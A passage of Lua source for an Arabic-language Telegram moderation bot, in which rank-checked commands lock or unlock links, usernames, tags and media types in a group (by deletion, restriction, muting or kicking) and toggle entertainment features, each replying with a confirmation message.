tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح البوتات ')
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح البوتات بالطرد ')
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح الاشعارات ')
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح التثبيت ')
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح تعديل ')
end,nil)   
elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح الفارسيه ')
end,nil)   
elseif text == 'فتح الانجليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح الانجليزيه ')
end,nil)
elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح تعديل ')
end,nil)    
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فـتح جميع الاوامر ')
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الروابط ')
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الروابط بالتقييد ')
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الروابط بالكتم ')
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الروابط بالطرد ')
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الروابط ')
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المعرفات ')
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المعرفات بالتقييد ')
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المعرفات بالكتم ')
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المعرفات بالطرد ')
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح المعرفات ')
end,nil)   
end
if text == 'تفعيل غنيلي' and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = '◉ تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = '◉ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n◉ تم تعطيل امر غنيلي'
else
Text = '\n◉ بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الحب' and Manager(msg) then   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = ' ◉ تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' and Manager(msg) then  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل نسبه الحب'
else
Text = '\n ◉ بالتاكيد تم تعطيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' and Manager(msg) then   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = ' ◉ تم تفعيل نسبه الرجوله'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' and Manager(msg) then  
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل نسبه الرجوله'
else
Text = '\n ◉ بالتاكيد تم تعطيل نسبه الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' and Manager(msg) then   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = ' ◉ تم تفعيل نسبه الكره'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' and Manager(msg) then  
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل نسبه الكره'
else
Text = '\n ◉ بالتاكيد تم تعطيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' and Manager(msg) then   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
Text = ' ◉ تم تفعيل نسبه الانوثه'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' and Manager(msg) then  
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل نسبه الانوثه'
else
Text = '\n ◉ بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' ◉ تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر @all'
else
Text = '\n ◉ بالتاكيد تم تعطيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل قول' and CoSu(msg) then   
if database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
Text = ' ◉ تم تفعيل امر قول'
database:del(bot_id..'Speak:after:me'..msg.chat_id_)  
else
Text = ' ◉ بالتاكيد تم تفعيل امر قول'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'تعطيل قول' and CoSu(msg) then  
if not database:get(bot_id..'Speak:after:me'..msg.chat_id_) then
database:set(bot_id..'Speak:after:me'..msg.chat_id_,true)  
Text = '\n ◉ تم تعطيل امر قول'
else
Text = '\n ◉ بالتاكيد تم تعطيل امر قول'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التاك ')
end,nil)   
elseif text == 'قفل التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التاك بالطرد ')
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح التاك ')
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الشارحه ')
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الشارحه بالتقييد ')
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الشارحه بالكتم ')
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الشارحه بالطرد ')
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الشارحه ')
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصور ')
end,nil)   
elseif text == 'قفل الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصور بالتقييد ')
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصور بالكتم ')
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصور بالطرد ')
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الصور ')
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الفيديو ')
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الفيديو بالتقييد ')
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الفيديو بالكتم ')
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الفيديو بالطرد ')
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الفيديو ')
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المتحركه ')
end,nil)   
elseif text == 'قفل المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المتحركه بالتقييد ')
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المتحركه بالكتم ')
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل المتحركه بالطرد ')
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح المتحركه ')
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الالعاب ')
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الالعاب بالتقييد ')
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الالعاب بالكتم ')
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الالعاب بالطرد ')
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الالعاب ')
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاغاني ')
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاغاني بالتقييد ')
end,nil)   
